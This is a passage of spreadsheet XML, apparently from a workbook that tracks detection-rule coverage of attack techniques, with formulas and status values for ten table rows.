        <f t="array" ref="M470">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N470" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O470" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P470" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S47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70" t="s">
        <v>368</v>
      </c>
      <c r="U470" t="s">
        <v>2269</v>
      </c>
      <c r="V470" t="s">
        <v>2270</v>
      </c>
      <c r="W470" t="b">
        <v>1</v>
      </c>
      <c r="X470" t="s">
        <v>2259</v>
      </c>
    </row>
    <row r="471" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A471" t="s">
        <v>2259</v>
      </c>
      <c r="B471" t="s">
        <v>2271</v>
      </c>
      <c r="C471" t="s">
        <v>2272</v>
      </c>
      <c r="D471" t="s">
        <v>6</v>
      </c>
      <c r="E471" t="s">
        <v>2273</v>
      </c>
      <c r="F471" s="9">
        <f t="shared" si="7"/>
        <v>4</v>
      </c>
      <c r="G471" s="9" cm="1">
        <f t="array" ref="G471">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H471" s="9" t="str" cm="1">
        <f t="array" ref="H471">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I471" s="9" t="str" cm="1">
        <f t="array" ref="I471">IF(SUM(IF($C471=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C471=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J471" s="9" t="str" cm="1">
        <f t="array" ref="J47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71" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M471" s="9" cm="1">
        <f t="array" ref="M471">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N471" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O471" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P471" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S47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71" t="s">
        <v>368</v>
      </c>
      <c r="U471" t="s">
        <v>2274</v>
      </c>
      <c r="V471" t="s">
        <v>2275</v>
      </c>
      <c r="W471" t="b">
        <v>1</v>
      </c>
      <c r="X471" t="s">
        <v>2259</v>
      </c>
    </row>
    <row r="472" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A472" t="s">
        <v>2259</v>
      </c>
      <c r="B472" t="s">
        <v>2276</v>
      </c>
      <c r="C472" t="s">
        <v>2277</v>
      </c>
      <c r="D472" t="s">
        <v>6</v>
      </c>
      <c r="E472" t="s">
        <v>2278</v>
      </c>
      <c r="F472" s="9">
        <f t="shared" si="7"/>
        <v>5</v>
      </c>
      <c r="G472" s="9" cm="1">
        <f t="array" ref="G472">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H472" s="9" t="str" cm="1">
        <f t="array" ref="H472">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I472" s="9" t="str" cm="1">
        <f t="array" ref="I472">IF(SUM(IF($C472=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C472=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J472" s="9" t="str" cm="1">
        <f t="array" ref="J47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72" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M472" s="9" cm="1">
        <f t="array" ref="M472">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N472" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O472" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P472" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S47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72" t="s">
        <v>386</v>
      </c>
      <c r="U472" t="s">
        <v>2279</v>
      </c>
      <c r="V472" t="s">
        <v>2280</v>
      </c>
      <c r="W472" t="b">
        <v>1</v>
      </c>
      <c r="X472" t="s">
        <v>2259</v>
      </c>
    </row>
    <row r="473" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A473" t="s">
        <v>2259</v>
      </c>
      <c r="B473" t="s">
        <v>2281</v>
      </c>
      <c r="C473" t="s">
        <v>2282</v>
      </c>
      <c r="D473" t="s">
        <v>6</v>
      </c>
      <c r="E473" t="s">
        <v>2283</v>
      </c>
      <c r="F473" s="9">
        <f t="shared" si="7"/>
        <v>3</v>
      </c>
      <c r="G473" s="9" cm="1">
        <f t="array" ref="G473">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H473" s="9" t="str" cm="1">
        <f t="array" ref="H473">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I473" s="9" t="str" cm="1">
        <f t="array" ref="I473">IF(SUM(IF($C473=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C473=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J473" s="9" t="str" cm="1">
        <f t="array" ref="J47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73" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M473" s="9" cm="1">
        <f t="array" ref="M473">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N473" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O473" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P473" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S47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73" t="s">
        <v>368</v>
      </c>
      <c r="U473" t="s">
        <v>2284</v>
      </c>
      <c r="V473" t="s">
        <v>2285</v>
      </c>
      <c r="W473" t="b">
        <v>1</v>
      </c>
      <c r="X473" t="s">
        <v>2259</v>
      </c>
    </row>
    <row r="474" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A474" t="s">
        <v>2259</v>
      </c>
      <c r="B474" t="s">
        <v>2286</v>
      </c>
      <c r="C474" t="s">
        <v>2287</v>
      </c>
      <c r="D474" t="s">
        <v>6</v>
      </c>
      <c r="E474" t="s">
        <v>2288</v>
      </c>
      <c r="F474" s="9">
        <f t="shared" si="7"/>
        <v>6</v>
      </c>
      <c r="G474" s="9" cm="1">
        <f t="array" ref="G474">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H474" s="9" t="str" cm="1">
        <f t="array" ref="H474">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I474" s="9" t="str" cm="1">
        <f t="array" ref="I474">IF(SUM(IF($C474=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C474=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J474" s="9" t="str" cm="1">
        <f t="array" ref="J47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74" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M474" s="9" cm="1">
        <f t="array" ref="M474">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N474" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O474" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P474" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S47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74" t="s">
        <v>368</v>
      </c>
      <c r="U474" t="s">
        <v>2289</v>
      </c>
      <c r="V474" t="s">
        <v>2290</v>
      </c>
      <c r="W474" t="b">
        <v>1</v>
      </c>
      <c r="X474" t="s">
        <v>2259</v>
      </c>
    </row>
    <row r="475" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A475" t="s">
        <v>2259</v>
      </c>
      <c r="B475" t="s">
        <v>2291</v>
      </c>
      <c r="C475" t="s">
        <v>2292</v>
      </c>
      <c r="D475" t="s">
        <v>6</v>
      </c>
      <c r="E475" t="s">
        <v>2293</v>
      </c>
      <c r="F475" s="9">
        <f t="shared" si="7"/>
        <v>2</v>
      </c>
      <c r="G475" s="9" cm="1">
        <f t="array" ref="G475">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H475" s="9" t="str" cm="1">
        <f t="array" ref="H475">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I475" s="9" t="str" cm="1">
        <f t="array" ref="I475">IF(SUM(IF($C475=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C475=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J475" s="9" t="str" cm="1">
        <f t="array" ref="J47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75" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M475" s="9" cm="1">
        <f t="array" ref="M475">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N475" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O475" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P475" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S47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75" t="s">
        <v>368</v>
      </c>
      <c r="U475" t="s">
        <v>2294</v>
      </c>
      <c r="V475" t="s">
        <v>2295</v>
      </c>
      <c r="W475" t="b">
        <v>1</v>
      </c>
      <c r="X475" t="s">
        <v>2259</v>
      </c>
    </row>
    <row r="476" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A476" t="s">
        <v>2259</v>
      </c>
      <c r="B476" t="s">
        <v>2296</v>
      </c>
      <c r="C476" t="s">
        <v>274</v>
      </c>
      <c r="D476" t="s">
        <v>6</v>
      </c>
      <c r="E476" t="s">
        <v>2297</v>
      </c>
      <c r="F476" s="9">
        <f t="shared" si="7"/>
        <v>3</v>
      </c>
      <c r="G476" s="9" cm="1">
        <f t="array" ref="G476">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H476" s="9" t="str" cm="1">
        <f t="array" ref="H476">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I476" s="9" t="str" cm="1">
        <f t="array" ref="I476">IF(SUM(IF($C476=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C476=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J476" s="9" t="str" cm="1">
        <f t="array" ref="J47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76" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M476" s="9" cm="1">
        <f t="array" ref="M476">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N476" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O476" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P476" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S47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76" t="s">
        <v>930</v>
      </c>
      <c r="U476" t="s">
        <v>2298</v>
      </c>
      <c r="V476" t="s">
        <v>2299</v>
      </c>
      <c r="W476" t="b">
        <v>1</v>
      </c>
      <c r="X476" t="s">
        <v>2259</v>
      </c>
    </row>
    <row r="477" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A477" t="s">
        <v>2259</v>
      </c>
      <c r="B477" t="s">
        <v>2300</v>
      </c>
      <c r="C477" t="s">
        <v>2301</v>
      </c>
      <c r="D477" t="s">
        <v>6</v>
      </c>
      <c r="E477" t="s">
        <v>544</v>
      </c>
      <c r="F477" s="9">
        <f t="shared" si="7"/>
        <v>4</v>
      </c>
      <c r="G477" s="9" cm="1">
        <f t="array" ref="G477">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H477" s="9" t="str" cm="1">
        <f t="array" ref="H477">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I477" s="9" t="str" cm="1">
        <f t="array" ref="I477">IF(SUM(IF($C477=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C477=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J477" s="9" t="str" cm="1">
        <f t="array" ref="J47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77" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M477" s="9" cm="1">
        <f t="array" ref="M477">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N477" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O477" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P477" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S47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77" t="s">
        <v>658</v>
      </c>
      <c r="U477" t="s">
        <v>2302</v>
      </c>
      <c r="V477" t="s">
        <v>2303</v>
      </c>
      <c r="W477" t="b">
        <v>1</v>
      </c>
      <c r="X477" t="s">
        <v>2259</v>
      </c>
    </row>
    <row r="478" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A478" t="s">
        <v>2259</v>
      </c>
      <c r="B478" t="s">
        <v>2304</v>
      </c>
      <c r="C478" t="s">
        <v>2305</v>
      </c>
      <c r="D478" t="s">
        <v>6</v>
      </c>
      <c r="E478" t="s">
        <v>2306</v>
      </c>
      <c r="F478" s="9">
        <f t="shared" si="7"/>
        <v>1</v>
      </c>
      <c r="G478" s="9" cm="1">
        <f t="array" ref="G478">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H478" s="9" t="str" cm="1">
        <f t="array" ref="H478">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I478" s="9" t="str" cm="1">
        <f t="array" ref="I478">IF(SUM(IF($C478=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C478=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J478" s="9" t="str" cm="1">
        <f t="array" ref="J47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78" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M478" s="9" cm="1">
        <f t="array" ref="M478">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N478" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O478" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P478" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S47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78" t="s">
        <v>386</v>
      </c>
      <c r="U478" t="s">
        <v>2307</v>
      </c>
      <c r="V478" t="s">
        <v>2308</v>
      </c>
      <c r="W478" t="b">
        <v>1</v>
      </c>
      <c r="X478" t="s">
        <v>2259</v>
      </c>
    </row>
    <row r="479" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A479" t="s">
        <v>2259</v>
      </c>
      <c r="B479" t="s">
        <v>2309</v>
      </c>
      <c r="C479" t="s">
        <v>2310</v>
      </c>
      <c r="D479" t="s">
        <v>6</v>
      </c>
      <c r="E479" t="s">
        <v>463</v>
      </c>
      <c r="F479" s="9">
        <f t="shared" si="7"/>
        <v>2</v>
      </c>
      <c r="G479" s="9" cm="1">
        <f t="array" ref="G479">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H479" s="9" t="str" cm="1">
        <f t="array" ref="H479">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I479" s="9" t="str" cm="1">
        <f t="array" ref="I479">IF(SUM(IF($C479=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C479=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J479" s="9" t="str" cm="1">
        <f t="array" ref="J47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79" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M479" s="9" cm="1">
        <f t="array" ref="M479">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N479" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O479" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P479" s="14" t="str">
